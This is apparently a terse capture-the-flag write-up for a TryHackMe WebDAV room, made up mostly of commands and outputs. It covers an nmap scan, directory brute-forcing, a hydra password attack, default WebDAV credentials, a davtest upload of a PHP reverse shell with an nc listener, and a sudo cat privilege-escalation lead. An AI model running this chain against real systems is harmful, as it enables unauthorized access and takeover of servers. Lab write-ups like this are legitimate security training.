```http
https://tryhackme.com/room/bsidesgtdav
```

```ip
10.10.209.9
```
___
# Recon
## Nmap
```bash
nmap -p- -sC -sV -Pn 10.10.209.9 -T5 -vv  
```

```resoults
80/tcp    open     http         syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

___
## Dirsearch
```bash
dirsearch -u http://10.10.209.9/    
```

```resoults
[14:57:02] 401 -  458B  - /webdav/                                          
[14:57:02] 401 -  458B  - /webdav/index.html                                
[14:57:02] 401 -  458B  - /webdav/servlet/webdav/
```


```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 10.10.209.9 http-get /webdav/index.html -V -t 64
```

```resoults
n/a
```
___
## Search google

```http
https://hacktricks.boitatech.com.br/pentesting/pentesting-web/put-method-webdav
```

```http
https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html
```
default creds))
```http
http://10.10.209.9/webdav/passwd.dav
```

```
wampp:$apr1$Wm2VTkFL$PVNRQv7k******4qKA91
```
## Hashcat
```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt 
```

```resoults
n/a
```
___
# RCE
```http
https://www.revshells.com/
```
```
Linux-> PHP PentestMonkey
```

```bash
davtest -url http://10.10.209.9/webdav/ -auth wampp:xampp -uploadfile shell.php -uploadloc shell.php
```

```bash
nc -lnvp 1337
```

```http
http://10.10.209.9/webdav/shell.php
```
___
# LPE

```bash
sudo -l
```

```resoults
(ALL) NOPASSWD: /bin/cat
```
